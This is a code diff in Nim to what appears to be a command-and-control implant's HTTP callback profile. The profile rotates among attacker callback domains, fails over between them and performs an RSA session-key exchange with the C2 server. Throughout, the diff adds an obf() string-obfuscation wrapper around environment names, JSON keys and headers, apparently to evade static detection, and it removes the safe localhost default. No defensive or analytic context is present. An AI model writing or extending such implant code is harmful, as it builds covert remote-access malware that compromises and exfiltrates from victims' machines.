@@ -3,8 +3,9 @@ import ../config
 import ../utils/crypto
 import ../utils/httpx_client
 import ../utils/debug
+import ../utils/strenc
 
-const encryptedExchange {.used.} = static: getEnv("ENCRYPTED_EXCHANGE_CHECK", "false").toLowerAscii in ["true", "t"]
+const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]
 when encryptedExchange:
   import ../utils/rsa
 
@@ -25,27 +26,34 @@ proc newHttpxProfile*(): HttpxProfile =
   result.currentDomainIndex = 0
   
   # Parse callback_domains from JSON array
-  let domainsStr = static: getEnv("CALLBACK_DOMAINS", "[\"http://127.0.0.1\"]")
+  let domainsStr = static: getEnv(obf("CALLBACK_DOMAINS"))
+  if domainsStr.len == 0:
+    raise newException(ValueError, obf("CALLBACK_DOMAINS environment variable is not set"))
   try:
     let domainsJson = parseJson(domainsStr)
     result.callbackDomains = @[]
     for domain in domainsJson:
       result.callbackDomains.add(domain.getStr())
   except:
-    result.callbackDomains = @["http://127.0.0.1"]
-  
+    raise newException(ValueError, obf("Failed to parse CALLBACK_DOMAINS"))
+
   # Get domain rotation strategy
-  result.domainRotation = static: getEnv("DOMAIN_ROTATION", "round-robin")
-  
+  let domainRotationStr = static: getEnv(obf("DOMAIN_ROTATION"))
+  if domainRotationStr.len == 0:
+    raise newException(ValueError, obf("DOMAIN_ROTATION environment variable is not set"))
+  result.domainRotation = domainRotationStr
+
   # Get failover threshold
-  let thresholdStr = static: getEnv("FAILOVER_THRESHOLD", "3")
+  let thresholdStr = static: getEnv(obf("FAILOVER_THRESHOLD"))
+  if thresholdStr.len == 0:
+    raise newException(ValueError, obf("FAILOVER_THRESHOLD environment variable is not set"))
   try:
     result.failoverThreshold = parseInt(thresholdStr)
   except:
-    result.failoverThreshold = 3
+    raise newException(ValueError, obf("FAILOVER_THRESHOLD is not a valid integer"))
   
   # Parse raw_c2_config
-  let rawConfigStr = static: getEnv("RAW_C2_CONFIG", "")
+  let rawConfigStr = static: getEnv(obf("RAW_C2_CONFIG"), "")
   if rawConfigStr.len > 0:
     try:
       result.rawC2Config = parseJson(rawConfigStr)
@@ -62,10 +70,10 @@ proc newHttpxProfile*(): HttpxProfile =
 proc selectDomain(profile: var HttpxProfile): string =
   ## Select domain based on rotation strategy
   case profile.domainRotation
-  of "random":
+  of obf("random"):
     randomize()
     result = profile.callbackDomains[rand(profile.callbackDomains.len - 1)]
-  of "round-robin":
+  of obf("round-robin"):
     result = profile.callbackDomains[profile.currentDomainIndex]
     profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.callbackDomains.len
   else: # fail-over
@@ -83,7 +91,7 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
       debug jsonData.pretty()
     else:
       debug "[DEBUG] Request: Large payload (", data.len, " bytes)"
-      if jsonData.hasKey("action"):
+      if jsonData.hasKey(obf("action")):
         debug "[DEBUG] Action: ", jsonData["action"].getStr()
   except:
     debug "[DEBUG] Request data (first 500 chars): ", data[0..<min(500, data.len)]
@@ -114,7 +122,7 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
     # Try domains based on rotation strategy
     var rawResponse: string
     case profile.domainRotation
-    of "random", "round-robin":
+    of obf("random"), obf("round-robin"):
       let baseUrl = profile.selectDomain()
       let fullUrl = baseUrl & uri
       try:
@@ -164,7 +172,7 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
     let fullUrl = baseUrl & "/" & profile.config.postUri
     try:
       let client = newHttpClient()
-      client.headers = newHttpHeaders({"User-Agent": profile.config.userAgent})
+      client.headers = newHttpHeaders({obf("User-Agent"): profile.config.userAgent})
       result = client.postContent(fullUrl, payload)
       # Decrypt or decode response
       if profile.aesKey.len > 0 and callbackUuid.len > 0:
@@ -218,20 +226,20 @@ proc performKeyExchange*(profile: var HttpxProfile): tuple[success: bool, newUui
       for i in 0..19:
         sessionId[i] = char(rand(25) + ord('a'))
       let stagingMsg = %*{
-        "action": "staging_rsa",
-        "pub_key": encode(rsaKey.publicKeyPem),
-        "session_id": sessionId
+        obf("action"): obf("staging_rsa"),
+        obf("pub_key"): encode(rsaKey.publicKeyPem),
+        obf("session_id"): sessionId
       }
       let response = profile.send($stagingMsg, profile.config.uuid)
       if response.len == 0:
         freeRsaKeyPair(rsaKey)
         return (false, "")
       let respJson = parseJson(response)
-      if not respJson.hasKey("session_key") or not respJson.hasKey("uuid"):
+      if not respJson.hasKey(obf("session_key")) or not respJson.hasKey(obf("uuid")):
         freeRsaKeyPair(rsaKey)
         return (false, "")
-      let encryptedSessionKey = decode(respJson["session_key"].getStr())
-      let newUuid = respJson["uuid"].getStr()
+      let encryptedSessionKey = decode(respJson[obf("session_key")].getStr())
+      let newUuid = respJson[obf("uuid")].getStr()
       let encryptedBytes = cast[seq[byte]](encryptedSessionKey)
       let decryptedKey = rsaPrivateDecrypt(rsaKey, encryptedBytes)
       if decryptedKey.len == 0:
